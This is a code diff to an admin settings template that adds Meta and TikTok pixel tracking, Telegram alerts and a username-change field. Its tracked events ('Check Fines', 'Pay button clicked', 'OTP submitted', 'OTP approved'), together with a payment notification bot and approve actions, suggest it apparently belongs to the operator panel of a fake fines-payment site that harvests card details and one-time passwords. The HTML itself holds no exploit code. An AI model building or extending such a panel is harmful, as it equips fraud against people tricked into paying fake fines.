@@ -49,6 +49,87 @@
   </div>
 </div>
 
+<!-- Meta & TikTok Pixel -->
+<div class="table-card" style="margin-bottom:20px;">
+  <div class="tc-header">
+    <div class="tc-title">Meta Pixel &amp; Conversions API (CAPI)</div>
+  </div>
+  <div class="form-section">
+    <form method="POST" action="/admin/settings">
+      <input type="hidden" name="save_telegram" value="1">
+
+      <!-- Meta bölümü -->
+      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
+        Meta (Facebook) Pixel
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>Pixel ID</label>
+          <input type="text" name="meta_pixel_id" value="<%= metaPixelId %>" placeholder="1260674512113479" class="mono" autocomplete="off">
+          <div class="field-hint">Frontend pixel ID — injected into public pages.</div>
+        </div>
+        <div class="form-group">
+          <label>Access Token (CAPI)</label>
+          <input type="text" name="meta_access_token" value="<%= metaAccessToken %>" placeholder="EAAxxxxxxxxxxxxxxx" class="mono" autocomplete="off">
+          <div class="field-hint">Server-side Conversions API token from Events Manager.</div>
+        </div>
+        <div class="form-group">
+          <label>Test Event Code</label>
+          <input type="text" name="meta_test_event_code" value="<%= metaTestEventCode %>" placeholder="TEST12345" class="mono" autocomplete="off">
+          <div class="field-hint">Optional. Leave empty in production.</div>
+        </div>
+      </div>
+
+      <!-- TikTok bölümü -->
+      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;margin-top:8px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
+        TikTok Pixel
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>TikTok Pixel ID</label>
+          <input type="text" name="tiktok_pixel_id" value="<%= tiktokPixelId %>" placeholder="CXXXXXXXXXXXXXXXXX" class="mono" autocomplete="off">
+          <div class="field-hint">Found in TikTok Ads Manager → Assets → Events.</div>
+        </div>
+        <div class="form-group">
+          <label>TikTok Access Token (Events API)</label>
+          <input type="text" name="tiktok_access_token" value="<%= tiktokAccessToken %>" placeholder="xxxxxxxx..." class="mono" autocomplete="off">
+          <div class="field-hint">Server-side Events API token for CAPI.</div>
+        </div>
+      </div>
+
+      <!-- Tracked Events info -->
+      <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:14px 16px;margin-bottom:16px;font-size:12px;color:#475569;">
+        <strong style="display:block;margin-bottom:8px;color:#0f172a;">Tracked Events (both Meta &amp; TikTok)</strong>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:6px;">
+          <div>📍 <b>PageView</b> — on page load</div>
+          <div>🔍 <b>Search</b> — Check Fines button</div>
+          <div>💳 <b>InitiateCheckout</b> — Pay button clicked</div>
+          <div>✅ <b>Purchase</b> — OTP approved</div>
+          <div>📲 <b>SubmitApplication</b> — OTP submitted</div>
+          <div>👁️ <b>ViewContent</b> — Fines page loaded</div>
+        </div>
+      </div>
+
+      <!-- Telegram alert toggle -->
+      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
+        Admin Panel Alerts
+      </div>
+      <div class="form-group">
+        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;">
+          <input type="checkbox" name="admin_tg_alerts" value="1" <%= adminTgAlerts==='1' ? 'checked' : '' %>
+                 style="width:16px;height:16px;accent-color:#006837;">
+          <span>Send Telegram notification on login &amp; critical actions (approve, delete, settings save)</span>
+        </label>
+        <div class="field-hint">Uses the Payment Notification Bot Token and Chat ID above.</div>
+      </div>
+
+      <div class="form-actions">
+        <button type="submit" class="btn btn-primary">Save Pixel &amp; Alert Settings</button>
+      </div>
+    </form>
+  </div>
+</div>
+
 <!-- Telegram & API Settings -->
 <div class="table-card" style="margin-bottom:20px;">
   <div class="tc-header">
@@ -121,6 +202,10 @@
     <form method="POST" action="/admin/settings" style="max-width:480px;">
       <input type="hidden" name="change_password" value="1">
 
+      <div class="form-group">
+        <label>New Username <span style="font-weight:400;color:#94a3b8;">(leave empty to keep current)</span></label>
+        <input type="text" name="new_username" placeholder="<%= adminUser %>" autocomplete="off">
+      </div>
       <div class="form-group">
         <label>Current Password</label>
         <input type="password" name="current_password" placeholder="Enter current password" autocomplete="current-password" required>
